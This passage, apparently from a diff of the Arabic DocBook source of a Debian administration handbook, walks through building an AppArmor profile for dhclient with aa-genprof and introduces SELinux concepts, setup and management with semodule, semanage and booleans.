+19592 /usr/lib/dleyna-renderer/dleyna-renderer-service not confined</computeroutput>
+      </screen>
+      <para>سنحاول إذاً في المثال التالي إنشاء بروفايل للبرنامج <command dir="ltr">/sbin/dhclient</command>. سوف نستخدم <command>aa-genprof dhclient</command>. سوف يدعوك لاستخدام التطبيق في نافذة أخرى وعندما تنتهي عد إلى <command>aa-genprof</command> لفحص أحداث AppArmor في سجلات النظام وتحويل هذه السجلات إلى قواعد تحكم بالوصول. سوف يقترح عليك قاعدة وصول واحدة أو أكثر مقابل كل حدث مسجل، ويمكنك الموافقة على المقترحات أو تعديلها بعدة طرق:</para>
+      <screen>
+<computeroutput># </computeroutput><userinput>aa-genprof dhclient</userinput>
+<computeroutput>Writing updated profile for /sbin/dhclient.
+Setting /sbin/dhclient to complain mode.
+
+Before you begin, you may wish to check if a
+profile already exists for the application you
+wish to confine. See the following wiki page for
+more information:
+http://wiki.apparmor.net/index.php/Profiles
+
+Please start the application to be profiled in
+another window and exercise its functionality now.
+
+Once completed, select the "Scan" option below in 
+order to scan the system logs for AppArmor events. 
+
+For each AppArmor event, you will be given the 
+opportunity to choose whether the access should be 
+allowed or denied.
+
+Profiling: /sbin/dhclient
+
+[(S)can system log for AppArmor events] / (F)inish
+Reading log entries from /var/log/audit/audit.log.
+
+Profile:  /sbin/dhclient <co id="aa-genprof-execute"></co>
+Execute:  /usr/lib/NetworkManager/nm-dhcp-helper
+Severity: unknown
+
+(I)nherit / (C)hild / (P)rofile / (N)amed / (U)nconfined / (X) ix On / (D)eny / Abo(r)t / (F)inish
+<userinput>P</userinput>
+Should AppArmor sanitise the environment when
+switching profiles?
+
+Sanitising environment is more secure,
+but some applications depend on the presence
+of LD_PRELOAD or LD_LIBRARY_PATH.
+
+(Y)es / [(N)o]
+<userinput>Y</userinput>
+Writing updated profile for /usr/lib/NetworkManager/nm-dhcp-helper.
+Complain-mode changes:
+WARN: unknown capability: CAP_net_raw
+
+Profile:    /sbin/dhclient <co id="aa-genprof-capability"></co>
+Capability: net_raw
+Severity:   unknown
+
+[(A)llow] / (D)eny / (I)gnore / Audi(t) / Abo(r)t / (F)inish
+<userinput>A</userinput>
+Adding capability net_raw to profile.
+
+Profile:  /sbin/dhclient <co id="aa-genprof-read"></co>
+Path:     /etc/nsswitch.conf
+Mode:     r
+Severity: unknown
+
+  1 - #include &lt;abstractions/apache2-common&gt; 
+  2 - #include &lt;abstractions/libvirt-qemu&gt; 
+  3 - #include &lt;abstractions/nameservice&gt; 
+  4 - #include &lt;abstractions/totem&gt; 
+ [5 - /etc/nsswitch.conf]
+[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
+<userinput>3</userinput>
+
+Profile:  /sbin/dhclient
+Path:     /etc/nsswitch.conf
+Mode:     r
+Severity: unknown
+
+  1 - #include &lt;abstractions/apache2-common&gt; 
+  2 - #include &lt;abstractions/libvirt-qemu&gt; 
+ [3 - #include &lt;abstractions/nameservice&gt;]
+  4 - #include &lt;abstractions/totem&gt; 
+  5 - /etc/nsswitch.conf 
+[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
+<userinput>A</userinput>
+Adding #include &lt;abstractions/nameservice&gt; to profile.
+
+Profile:  /sbin/dhclient
+Path:     /proc/7252/net/dev
+Mode:     r
+Severity: 6
+
+  1 - /proc/7252/net/dev 
+ [2 - /proc/*/net/dev]
+[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
+<userinput>A</userinput>
+Adding /proc/*/net/dev r to profile
+
+[...]
+Profile:  /sbin/dhclient <co id="aa-genprof-write"></co>
+Path:     /run/dhclient-eth0.pid
+Mode:     w
+Severity: unknown
+
+ [1 - /run/dhclient-eth0.pid]
+[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
+<userinput>N</userinput>
+
+Enter new path: /run/dhclient*.pid
+
+Profile:  /sbin/dhclient
+Path:     /run/dhclient-eth0.pid
+Mode:     w
+Severity: unknown
+
+  1 - /run/dhclient-eth0.pid 
+ [2 - /run/dhclient*.pid]
+[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
+<userinput>A</userinput>
+Adding /run/dhclient*.pid w to profile
+
+[...]
+Profile:  /usr/lib/NetworkManager/nm-dhcp-helper <co id="aa-genprof-other-profile"></co>
+Path:     /proc/filesystems
+Mode:     r
+Severity: 6
+
+ [1 - /proc/filesystems]
+[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
+<userinput>A</userinput>
+Adding /proc/filesystems r to profile
+
+= Changed Local Profiles =
+
+The following local profiles were changed. Would you like to save them?
+
+ [1 - /sbin/dhclient]
+  2 - /usr/lib/NetworkManager/nm-dhcp-helper 
+(S)ave Changes / Save Selec(t)ed Profile / [(V)iew Changes] / View Changes b/w (C)lean profiles / Abo(r)t
+<userinput>S</userinput>
+Writing updated profile for /sbin/dhclient.
+Writing updated profile for /usr/lib/NetworkManager/nm-dhcp-helper.
+
+Profiling: /sbin/dhclient
+
+[(S)can system log for AppArmor events] / (F)inish
+<userinput>F</userinput>
+Setting /sbin/dhclient to enforce mode.
+Setting /usr/lib/NetworkManager/nm-dhcp-helper to enforce mode.
+
+Reloaded AppArmor profiles in enforce mode.
+
+Please consider contributing your new profile!
+See the following wiki page for more information:
+http://wiki.apparmor.net/index.php/Profiles
+
+Finished generating profile for /sbin/dhclient.</computeroutput></screen>
+      <para>لاحظ أن البرنامج لا يعيد عرض محارف التحكم التي تطبعها ولكنني ضمنتها في المقطع السابق لتوضيح الشرح.</para>
+      <calloutlist>
+        <callout arearefs="aa-genprof-execute">
+          <para>أول حدث مكتشف هو تنفيذ برنامج آخر. في هذه الحالة، لديك عدة اختيارات: يمكنك تشغيل البرنامج باستخدام بروفايل العملية الأم (خيار الوراثة ”Inherit“)، أو يمكنك تنفيذه باستخدام بروفايل خاص (عبر خياري ”Profile“ و”Named“ اللذان يختلفان عن بعضهما بإمكانية استخدام اسم بروفايل عشوائي فقط)، أو يمكنك تشغيله باستخدام بروفايل فرعي من العملية الأم (خيار ”Child“)، أو يمكنك تشغيله دون أي بروفايل (خيار ”Unconfined“) أو يمكنك عدم السماح بتشغيله نهائياً (خيار ”Deny“).</para>
+          <para>لاحظ أنك إذا اخترت تشغيله باستخدام بروفايل مخصص غير موجود بعد، فسوف تنشئ الأداة البروفايل المفقود كما ستقترح قواعد وصول لذلك البروفايل في الاستدعاء نفسه.</para>
+        </callout>
+        <callout arearefs="aa-genprof-capability">
+          <para>على مستوى النواة، قُسِّمت صلاحيات المستخدم الجذر إلى ”capabilities“ أو قدرات. إذا كانت إحدى نداءات النظام تحتاج لقدرة معينة، يتحقق AppArmor من أن البروفايل يسمح للبرنامج باستخدام هذه المقدرة.</para>
+        </callout>
+        <callout arearefs="aa-genprof-read">
+          <para>هنا يطلب البرنامج صلاحية القراءة للملف <filename dir="ltr">/etc/nsswitch.conf</filename>. اكتشف <command>aa-genprof</command> أن هذه الصلاحية قد منحت في عدة ”مستخلصات abstractions“ ويعرضها كخيارات بديلة. توفر المستخلصات مجموعات من قواعد الوصول القابلة لإعادة الاستخدام التي تجمع عدة موارد تستخدم مع بعضها عادة. في هذه الحالة، الوصول لهذا الملف يكون عبر دوال nameservice من مكتبة C وقد طبعنا ”3“ لتحديد الخيار ”‎#include &lt;abstractions/nameservice&gt;‎“ وبعدها ”A“ للسماح.</para>
+        </callout>
+        <callout arearefs="aa-genprof-write">
+          <para>يريد البرنامج إنشاء الملف <filename dir="ltr">/run/dhclient-eth0.pid</filename>. إذا سمحنا بإنشاء هذا الملف بعينه فقط فلن يعمل البرنامج عندما يستخدمه المستخدم على واجهة شبكية مختلفة. لذلك اخترنا ”New“ لاستبدال اسم الملف باسم أشمل ”‎/run/dhclient*.pid“ قبل تسجيل القاعدة باستخدام ”Allow“.</para>
+        </callout>
+        <callout arearefs="aa-genprof-other-profile">
+          <para>لاحظ أن طلب الوصول هذا ليس حزءاً من بروفايل dhclient وإنما من البروفايل الجديد الذي أنشأناه عندما سمحنا للبرنامج <filename dir="ltr">/usr/lib/NetworkManager/nm-dhcp-helper</filename> بالعمل ببروفايل خاص.</para>
+          <para>بعد المرور على كل الأحداث المسجلة، يعرض عليك البرنامج حفظ البروفايلات التي أنشأتها أثناء العملية. في هذه الحالة، لدينا بروفايلين وقد حفظناهما معاً باستخدام ”Save“ (لكن يمكنك حفظهما بشكل إفرادي أيضاً) قبل الخروج من البرنامج باستخدام ”Finish“.</para>
+        </callout>
+      </calloutlist>
+      <para>في الواقع، <command>aa-genprof</command> ما هو إلا غلاف ذكي للأمر <command>aa-logprof</command>: فهو ينشئ بروفايلاً فارغاً، ويحمله في وضع الشكوى ثم يستدعي <command>aa-logprof</command> وهي عبارة عن أداة تحدث البروفايل اعتماداً على انتهاكات القواعد المسجلة. ويمكنك إعادة استدعاء تلك الأداة لاحقاً لتحسين البروفايل الذي أنشأته الآن.</para>
+      <para>إذا أردت أن يكون البروفايل الذي أنشأته كاملاً، عليك استخدام البرنامج بكافة الطرق التي يشرع استخدامها. في حالة dhclient، هذا يعني تشغيله عبر مدير الشبكة (Network Manager)، وعبر ifupdown، وتشغيله يدوياً، الخ. في النهاية، قد تصل إلى ملف <filename dir="ltr">/etc/apparmor.d/sbin.dhclient</filename> مشابه لهذا:</para>
+      <programlisting>
+# Last Modified: Tue Sep  8 21:40:02 2015
+#include &lt;tunables/global&gt;
+
+/sbin/dhclient {
+  #include &lt;abstractions/base&gt;
+  #include &lt;abstractions/nameservice&gt;
+
+  capability net_bind_service,
+  capability net_raw,
+
+  /bin/dash r,
+  /etc/dhcp/* r,
+  /etc/dhcp/dhclient-enter-hooks.d/* r,
+  /etc/dhcp/dhclient-exit-hooks.d/* r,
+  /etc/resolv.conf.* w,
+  /etc/samba/dhcp.conf.* w,
+  /proc/*/net/dev r,
+  /proc/filesystems r,
+  /run/dhclient*.pid w,
+  /sbin/dhclient mr,
+  /sbin/dhclient-script rCx,
+  /usr/lib/NetworkManager/nm-dhcp-helper Px,
+  /var/lib/NetworkManager/* r,
+  /var/lib/NetworkManager/*.lease rw,
+  /var/lib/dhcp/*.leases rw,
+
+  profile /sbin/dhclient-script flags=(complain) {
+    #include &lt;abstractions/base&gt;
+    #include &lt;abstractions/bash&gt;
+
+    /bin/dash rix,
+    /etc/dhcp/dhclient-enter-hooks.d/* r,
+    /etc/dhcp/dhclient-exit-hooks.d/* r,
+    /sbin/dhclient-script r,
+
+  }
+}
+      </programlisting>
+    </section>
+  </section>
+
+  <section id="sect.selinux">
+    <title>مقدمة إلى SELinux</title>
+    <indexterm><primary>SELinux</primary></indexterm>
+    <section id="sect.selinux-principles">
+      <title>المبادئ</title>
+
+      <para>SELinux‏ (<emphasis>Security Enhanced Linux</emphasis>) هو نظام تحكم إلزامي بالوصول <emphasis>Mandatory Access Control</emphasis> مبني على واجهة LSM‏ (<emphasis>Linux Security Modules</emphasis>) في لينكس. عملياً، تستشير النواة SELinux قبل كل استدعاء للنظام حتى تعرف إذا كانت العملية المستدعية مخولة لتنفيذ الإجراء المطلوب.</para>
+
+      <para>يستخدم SELinux مجموعة من القواعد — تُعرَف باسم <emphasis>السياسة policy</emphasis> — لحظر الإجراءات أو السماح بها. إنشاء هذه القواعد صعب. لكن لحسن الحظ، هناك سياستين قياسيتين (<emphasis>targeted</emphasis> و <emphasis>strict</emphasis>) متاحتين لتوفير عناء معظم عملية الإعداد.</para>
+
+      <para>إدارة الصلاحيات مع SELinux تختلف تماماً عن نظم يونكس التقليدية. تعتمد صلاحيات العملية على <emphasis>سياقها الأمني</emphasis>. يتحدد السياق <emphasis>بهوية</emphasis> المستخدم الذي بدأ تنفيذ العملية، و<emphasis>الدور</emphasis> و<emphasis>النطاق</emphasis> الذين كان يحملهما المستخدم في ذلك الوقت. تعتمد الصلاحيات فعلياً على النطاق، لكن الأدوار هي التي تحكم الانتقالات بين النطاقات. أخيراً، تعتمد الانتقالات بين الأدوار على هوية المستخدم.</para>
+
+      <figure>
+        <title>السياق الأمني ومستخدمي يونكس</title>
+        <mediaobject>
+          <imageobject>
+            <imagedata fileref="images/selinux-context.png" scalefit="1" width="65%" />
+          </imageobject>
+        </mediaobject>
+      </figure>
+
+      <para>عملياً، يحصل المستخدم، لحظة تسجيل الدخول، على سياق أمني افتراضي (اعتماداً على الأدوار التي يحق له أخذها) . وبذلك يتحدد النطاق الحالي، أي النطاق الذي ستحمله جميع العمليات الأبناء الجديدة. إذا كنت تريد تغيير الدور الحالي والنطاق المرتيط معه، عليك استدعاء <command>newrole -r <replaceable>role_r</replaceable> -t <replaceable>domain_t</replaceable></command> (عادة يكون هناك نطاق وحيد فقط مسموح لكل دور، ولذلك يمكن إهمال المتغير <literal dir="ltr">-t</literal> غالباً). يتحقق هذا الأمر منك عبر طلب إدخال كلمة السر. تمنع هذه الميزة البرامج من تغيير الأدوار آلياً. لا يمكن تنفيذ هذه التغييرات إلا إذا كانت مسموحة صراحة في سياسة SELinux.</para>
+
+      <para>من الواضح أن الصلاحيات نفسها لا تنطبق على جميع <emphasis>الكائنات objects</emphasis> (ملفات، مجلدات، مقابس شبكية، أجهزة، الخ)، بل تختلف من كائن لآخر. لتحقيق هذا، يُربَط كل كائن مع <emphasis>نوع type</emphasis> (تعرف هذه العملية بالوسم labeling). تُمثَّل صلاحيات النطاق إذن بمجموعات من الإجراءات المسموحة (أو الممنوعة) على هذه الأنواع (وبالتالي، تنطبق بشكل غير مباشر على الكائنات التي وسمت بهذا النوع).</para>
+
+      <sidebar>
+        <title><emphasis>إضافة</emphasis> النطاقات والأنواع متساويان</title>
+
+	<para>داخلياً النطاق هو نوع، لكنه نوع يطبّق على العمليات. لذلك تلحق أسماء النطاقات بالرمز <literal dir="ltr">_t</literal> مثل أنواع الكائنات تماماً.</para>
+      </sidebar>
+
+      <para>افتراضياً، يرث البرنامج نطاقه من المستخدم الذي بدأ تنفيذه، لكن سياسات SELinux القياسية تتوقع تشغيل برامج مهمة عديدة في نطاقات خاصة بها. لتحقيق ذلك، توسم هذه البرامج التنفيذية بأنواع خاصة بها (مثلاً، يوسم <command>ssh</command> بالنوع <literal>ssh_exec_t</literal> وعند تشغيل البرنامج، سينتقل تلقائياً إلى النطاق <literal>ssh_t</literal>) . تسمح آلية الانتقال التلقائي بين النطاقات هذه بمنح كل برنامج الصلاحيات التي يحتاجها فقط. هذا أحد المبادئ الأساسية في SELinux.</para>
+
+      <figure>
+        <title>الانتقالات الآلية بين النطاقات</title>
+        <mediaobject>
+          <imageobject>
+            <imagedata fileref="images/selinux-transitions.png" scalefit="1" width="35%" />
+          </imageobject>
+        </mediaobject>
+      </figure>
+
+      <sidebar>
+        <title><emphasis>ممارسة عملية</emphasis> معرفة السياق الأمني</title>
+        <indexterm><primary>سياق أمني</primary></indexterm>
+        <indexterm><primary>سياق، سياق أمني</primary></indexterm>
+        <indexterm><primary>MCS (<emphasis>Multi-Category Security</emphasis>)</primary></indexterm>
+
+	<para>لمعرفة السياق الأمني لعملية معينة، عليك استخدام الخيار <literal>Z</literal> لبرنامج <command>ps</command>.</para>
+
+        <screen><computeroutput>$ </computeroutput><userinput>ps axZ | grep vstfpd</userinput>
+<computeroutput>system_u:system_r:ftpd_t:s0   2094 ?    Ss  0:00 /usr/sbin/vsftpd</computeroutput>
+</screen>
+
+	<para>يحوي الحقل الأول الهوية، والدور، والنطاق، ورتبة MCS، تفصل عن بعضها بنقاط رأسية. رتبة MCS‏ (<emphasis>Multi-Category Security</emphasis>) هي متغير يدخل في إعداد سياسة حماية السرية، التي تنظم الوصول للملفات اعتماداً على حساسيتها. هذه الميزة غير مشروحة في هذا الكتاب.</para>
+
+	<para>لمعرفة السياق الأمني الحالي في الصَدَفة، بمكنك استدعاء <command>id -Z</command>.</para>
+
+        <screen><computeroutput>$ </computeroutput><userinput>id -Z</userinput>
+<computeroutput>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</computeroutput>
+</screen>
+
+	<para>وأخيراً، لمعرفة النوع المرتبط بملف ما، يمكنك استخدام <command>ls -Z</command>.</para>
+
+        <screen><computeroutput>$ </computeroutput><userinput>ls -Z test /usr/bin/ssh</userinput>
+<computeroutput>unconfined_u:object_r:user_home_t:s0 test
+     system_u:object_r:ssh_exec_t:s0 /usr/bin/ssh</computeroutput>
+</screen>
+
+	<para>يجدر بالملاحظة أن الهوية والدور المسندين إلى الملفات لا تحملان أي أهمية خاصة (إذ أنها لا تستخدم أبداً)، لكن جميع الكائنات تتمتع بسياق أمني كامل في سبيل الحفاظ على الاتساق.</para>
+      </sidebar>
+    </section>
+    <section id="sect.selinux-setup">
+      <title>إعداد SELinux</title>
+
+      <para>دعم SELinux مبني ضمن النَوَى القياسية التي توفرها دبيان. كما تدعم أدوات يونكس الأساسية SELinux دون أي تعديلات. إذن من السهل نسبياً تفعيل SELinux.</para>
+
+      <para>سوف يثبت الأمر <command>apt install selinux-basics selinux-policy-default</command> آلياً الحزم اللازمة لإعداد نظام SELinux.</para>
+
+      <sidebar>
+        <title><emphasis>تحذير</emphasis> السياسة المرجعية غير مضمنة في جيسي</title>
+        <para>لسوء الحظ لم يعالج مشرفو الحزمة المصدرية <emphasis role="pkg">refpolicy</emphasis> العلل الحرجة التي تمنع إصدارها وقد أزيلت الحزمة من جيسي. هذا يعني أنه لا يمكن تثبيت حزم <emphasis dir="ltr" role="pkg">selinux-policy-*</emphasis> في جيسي ويجب الحصول عليها من مصدر آخر. نأمل أن تعود هذه الحزم في أحد الإصدارات الثانوية أو في المنقولات الخلفية لدبيان جيسي. وحتى ذلك الحين، يمكنك الحصول عليها من المستودعات غير المستقرة.</para>
+        <para>هذا الحال المؤسف يثبت على الأقل أن SELinux ليس له شعبية كبيرة بين المستخدمين/المطورين الذين يستخدمون النسخ التطويرية من دبيان. بالتالي، إذا كنت تريد استخدام SELinux، عليك أن تتوقع ألا تعمل السياسة الافتراضية بصورة مثالية وأنك ستضطر لاستثمار وقت معتبر لتعديلها بما يناسب حاجاتك الخاصة.</para>
+      </sidebar>
+
+      <para>تحوي الحزمة <emphasis role="pkg">selinux-policy-default</emphasis> مجموعة من الأدوات القياسية. افتراضياً، تُقيّد هذه السياسة الوصول لبضعة خدمات واسعة الانتشار. جلسات عمل المستخدمين غير مقيدة ولذلك يُستبعَد أن يمنع SELinux إجراءات المستخدمين المشروعة. ومع ذلك، يزيد هذا من أمان خدمات النظام التي تعمل على الجهاز. لإعداد سياسة تشبه القواعد ”الصارمة“ القديمة، عليك فقط تعطيل وحدة <literal>unconfined</literal> (سنشرح إدارة الوحدات لاحقاً في هذا القسم).</para>
+
+      <para>بعد تثبيت السياسة، عليك وسم جميع الملفات المتوفرة (أي إعطائهم نوعاً). يجب بدء تنفيذ هذه العملية يدوياً باستدعاء <command>fixfiles relabel</command>.</para>
+
+      <para>نظام SELinux جاهز الآن. لتفعيله عليك إضافة المتغير <literal>selinux=1 security=selinux</literal> إلى النواة لينكس. أما المتغير <literal>audit=1</literal> فيفعّل سجلات SELinux التي تسجل كل الإجراءات التي منعها. أخيراً، يضع المتغير <literal>enforcing=1</literal> القواعد في حيز التطبيق، إذ بدونه يعمل SELinux في وضع <emphasis>permissive</emphasis> الافتراضي حيث يكتفي بتسجيل الإجراءات الممنوعة لكنه يسمح بتنفيذها. عليك إذن تعديل ملف إعداد محمل الإقلاع GRUB لإضافة المتغيرات المطلوبة. إحدى الطرق السهلة لتنفيذ ذلك تعديل المتغير <literal>GRUB_CMDLINE_LINUX</literal> في الملف <filename>/etc/default/grub</filename> ثم استدعاء <command>update-grub</command>. سينشط SELinux بعد إعادة الإقلاع.</para>
+
+      <para>يجدر بالملاحظة أن السكربت <command>selinux-activate</command> يؤتمت هذه الخطوات ويفرض عملية الوسم عند الإقلاع التالي (وبذلك يتفادى إنشاء ملفات جديدة غير موسومة قبل تنشيط SELinux أو أثناء تنفيذ عملية الوسم).</para>
+    </section>
+    <section id="sect.selinux-management">
+      <title>إدارة نظام SELinux</title>
+      <indexterm><primary><command>semodule</command></primary></indexterm>
+      <indexterm><primary><command>semanage</command></primary></indexterm>
+
+      <para>سياسة SELinux هي مجموعة تجزيئية (modular) من القواعد، وتكتشف أثناء تثبيتها جميع الوحدات الملائمة وتُفعّلها آلياً اعتماداً على الخدمات المثبتة سابقاً. أي أن النظام جاهز للعمل مباشرة. لكن، إذا ثبَّتّ خدمة بعد تثبيت سياسة SELinux، يجب أن تتمكن بطريقة ما من تفعيل الوحدة المناسبة يدوياً. هذا هو الهدف من الأمر <command>semodule</command>. بالإضافة لذلك، يجب أن تتمكن من تعريف الأدوار التي يمكن أن يأخذها كل مستخدم، ويمكن تنفيذ هذا باستخدام الأمر <command>semanage</command>.</para>
+
+      <para>يمكن استخدام هذين الأمرين إذن لتعديل إعدادات SELinux الحالية، المخزنة في <filename>/etc/selinux/default/</filename>. بخلاف ملفات الإعداد الأخرى التي تجدها في <filename>/etc/</filename>، لا يجب تعديل أي من هذه الملفات يدوياً. بل يجب استخدام البرامج المخصصة لهذا الغرض.</para>
+
+      <sidebar>
+        <title><emphasis>التعمق أكثر</emphasis> وثائق إضافية</title>
+
+	<para>بما أن NSA لا تقدم أي توثيق رسمي، فقد أسس المجتمع ويكي ليعوض عن ذلك. يجمع هذا الويكي معلومات كثيرة. لكن عليك أن تدرك أن معظم المساهمين في SELinux هم من مستخدمي فيدورا (SELinux مفعل افتراضياً هناك). لذلك تميل الوثائق إلى التعامل مع تلك التوزيعة بشكل خاص. <ulink type="block" url="http://www.selinuxproject.org" /></para>
+
+	<para>عليك أيضاً إلقاء نظرة على صفحة ويكي دبيان المخصصة له بالإضافة لمدونة Russell Coker، وهو أحد أكثر مطوري دبيان نشاطاً في العمل على دعم SELinux. <ulink type="block" url="http://wiki.debian.org/SELinux" /> <ulink type="block" url="http://etbe.coker.com.au/tag/selinux/" /></para>
+      </sidebar>
+      <section>
+        <title>إدارة وحدات SELinux</title>
+
+	<para>تخزن وحدات SELinux في المجلد <filename>/usr/share/selinux/default/</filename>. لتنشيط إحدى هذه الوحدات في الإعداد الحالي، عليك استخدام <command>semodule -i <replaceable>module.pp.bz2</replaceable></command>. ترمز الإضافة <emphasis>pp.bz2</emphasis> للعبارة <emphasis>policy package</emphasis> (مضغوطة باستخدام bzip2).</para>
+
+	<para>يمكن إزالة وحدة من الإعداد الحالي باستخدام <command>semodule -r <replaceable>module</replaceable></command>. أخيراً، يسرد الأمر <command>semodule -l</command> الوحدات المُثبّتة حالياً، كما يطبع أرقام إصدارها. يمكن تفعيل الوحدات اختيارياً عبر <command>semodule -e</command> كما يمكن تعطيلها عبر <command>semodule -d</command>.</para>
+
+        <screen><computeroutput># </computeroutput><userinput>semodule -i /usr/share/selinux/default/abrt.pp.bz2</userinput>
+<computeroutput># </computeroutput><userinput>semodule -l</userinput>
+<computeroutput>abrt    1.5.0   Disabled
+accountsd       1.1.0   
+acct    1.6.0   
+[...]</computeroutput>
+<computeroutput># </computeroutput><userinput>semodule -e abrt</userinput>
+<computeroutput># </computeroutput><userinput>semodule -d accountsd</userinput>
+<computeroutput># </computeroutput><userinput>semodule -l</userinput>
+<computeroutput>abrt    1.5.0
+accountsd       1.1.0   Disabled
+acct    1.6.0   
+[...]</computeroutput>
+<computeroutput># </computeroutput><userinput>semodule -r abrt</userinput>
+<computeroutput># </computeroutput><userinput>semodule -l</userinput>
+<computeroutput>accountsd       1.1.0   Disabled
+acct    1.6.0   
+[...]</computeroutput></screen>
+
+	<para>يُحمّل <command>semodule</command> الإعدادات الجديدة فوراً ما لم تستخدم معه الخيار <literal dir="ltr">-n</literal>. يجدر بالملاحظة أن البرنامج يُعدِّل افتراضياً على الإعدادات الحالية (التي يشير لها المتغير <literal>SELINUXTYPE</literal> في <filename dir="ltr">/etc/selinux/config</filename>)، لكن يمكنك جعله يعدل على إعداد آخر عبر استخدام الخيار <literal dir="ltr">-s</literal>. </para>
+      </section>
+      <section>
+        <title>إدارة الهويات</title>
+
+	<para>في كل مرة يُسجّل فيها المستخدم دخوله، تُسنَد له هوية SELinux. تحدد هذه الهوية الأدوار التي يستطيع أخذها. يمكن إدارة هذه التقابلات (بين اسم المستخدم والهويّة، وبين هذه الهوية والأدوار) بالأمر <command>semanage</command>.</para>
+
+	<para>يتحتم عليك قراءة صفحة الدليل <citerefentry><refentrytitle>semanage</refentrytitle><manvolnum>8</manvolnum></citerefentry>‎، حتى لو بدت صيغة الأمر متشابهة بين جميع المجالات التي يديرها. سوف تجد خيارات مشتركة بين جميع الأوامر الفرعية: <literal dir="ltr">-a</literal> للإضافة، <literal dir="ltr">-d</literal> للحذف، <literal dir="ltr">-m</literal> للتعديل، <literal dir="ltr">-l</literal> للعرض، و <literal dir="ltr">-t</literal> لذكر النوع (أو النطاق).</para>
+
+	<para>يسرد الأمر <command>semanage login -l</command> التقابلات الحالية بين هويات المستخدمين وهويات SELinux. يحصل المستخدمون الذين ليس لهم مدخلة تقابل صريحة على الهوية المذكورة في المدخلة <literal>__default__</literal>. يربط الأمر <command>semanage login -a -s user_u <replaceable>user</replaceable></command> المستخدم المحدد بالهويّة <emphasis>user_u</emphasis>. وأخيراً، يُسقِط <command>semanage login -d <replaceable>user</replaceable></command> مدخلة التقابل المسندة للمستخدم.</para>
+
+        <screen><computeroutput># </computeroutput><userinput>semanage login -a -s user_u rhertzog</userinput>
+<computeroutput># </computeroutput><userinput>semanage login -l</userinput>
+<computeroutput>
+Login Name           SELinux User         MLS/MCS Range        Service
+
+__default__          unconfined_u         SystemLow-SystemHigh *
+rhertzog             user_u               SystemLow            *
+root                 unconfined_u         SystemLow-SystemHigh *
+system_u             system_u             SystemLow-SystemHigh *
+# </computeroutput><userinput>semanage login -d rhertzog</userinput> </screen>
+
+	<para>يسرد الأمر <command>semanage user -l</command> التقابلات بين هويات المستخدمين في SELinux والأدوار المسموحة. تحتاج إضافة هوية جديدة إلى تعريف الأدوار الموافقة لها بالإضافة لتعريف سابقة الوسم التي تستخدم لتعيين أنواع الملفات الشخصية (<filename dir="ltr">/home/<replaceable>user</replaceable>/*</filename>). إما أن تكون قيمة هذه السابقة <literal>user</literal> أو <literal>staff</literal> أو <literal>sysadm</literal>. استخدام  السابقة ”<literal>staff</literal>“ ينتج ملفات لهذا النوع ”<literal>staff_home_dir_t</literal>“. تنشأ هويات SELinux الجديدة باستخدام <command>semanage user -a -R <replaceable>roles</replaceable> -P <replaceable>prefix</replaceable> <replaceable>identity</replaceable></command>. أخيراً، يمكنك إزالة هوية مستخدم SELinux باستخدام <command>semanage user -d <replaceable>identity</replaceable></command>.</para>
+
+        <screen><computeroutput># </computeroutput><userinput>semanage user -a -R 'staff_r user_r' -P staff test_u</userinput>
+<computeroutput># </computeroutput><userinput>semanage user -l</userinput>
+<computeroutput>
+                Labeling   MLS/       MLS/                          
+SELinux User    Prefix     MCS Level  MCS Range             SELinux Roles
+
+root            sysadm     SystemLow  SystemLow-SystemHigh  staff_r sysadm_r system_r
+staff_u         staff      SystemLow  SystemLow-SystemHigh  staff_r sysadm_r
+sysadm_u        sysadm     SystemLow  SystemLow-SystemHigh  sysadm_r
+system_u        user       SystemLow  SystemLow-SystemHigh  system_r
+test_u          staff      SystemLow  SystemLow             staff_r user_r
+unconfined_u    unconfined SystemLow  SystemLow-SystemHigh  system_r unconfined_r
+user_u          user       SystemLow  SystemLow             user_r
+# </computeroutput><userinput>semanage user -d test_u</userinput></screen>
+      </section>
+      <section>
+        <title>إدارة سياقات الملفات والمنافذ والمتغيرات البوليانية</title>
+
+	<para>توفر كل وحدة من وحدات SELinux مجموعة من قواعد وسم الملفات، لكن يمكن أيضاً إضافة قواعد وسم مخصصة استجابة لحالة خاصة. مثلاً، إذا أردت أن يتمكن مخدم الوب من قراءة الملفات ضمن الشجرة <filename>/srv/www/</filename>، عليك تنفيذ <command dir="ltr">semanage fcontext -a -t httpd_sys_content_t "/srv/www(/.*)?"</command> يتبعه <command dir="ltr">restorecon -R /srv/www/</command>. يسجل الأمر الأول قواعد الوسم الجديدة ويعيد الأمر الثاني ضبط أنواع الملفات وفق قواعد الوسم الجديدة هذه.</para>
+
+	<para>بشكل مشابه، توسم منافذ TCP/IP بطريقة تضمن أن الخدمات المناسبة فقط تستطيع الإنصات لها. مثلاً، إذا أردت مخدم الوب أن يتمكن من الإنصات للمنفذ 8080، عليك تنفيذ <command>semanage port -m -t http_port_t -p tcp 8080</command>.</para>
+
+	<para>تُصدِّر بعض وحدات SELinux خيارات بوليانية يمكنك تعديلها لتغيير سلوك القواعد الافتراضية. يمكن استخدام الأداة <command>getsebool</command> لفحص هذه الخيارات (يعرض الأمر <command>getsebool <replaceable>boolean</replaceable></command> خياراً واحداً، أما <command>getsebool -a</command> فيعرضها كلها). يغيّر الأمر <command>setsebool <replaceable>boolean</replaceable> <replaceable>value</replaceable></command> القيمة الحالية للخيار البولياني. استخدام الخيار <literal dir="ltr">-P</literal> يجعل التغيير نهائياً، أي أن القيمة الجديدة ستصبح القيمة الافتراضية وسيحتفظ بها بعد إعادة الإقلاع. يمنح المثال التالي مخدمات الوب صلاحية الوصول لمجلدات بيوت المستخدمين (يفيد هذا عندما يملك المستخدمون مواقع شخصية في <filename dir="ltr">~/public_html/</filename>).</para>
+
+        <screen><computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput>
+<computeroutput>httpd_enable_homedirs --&gt; off
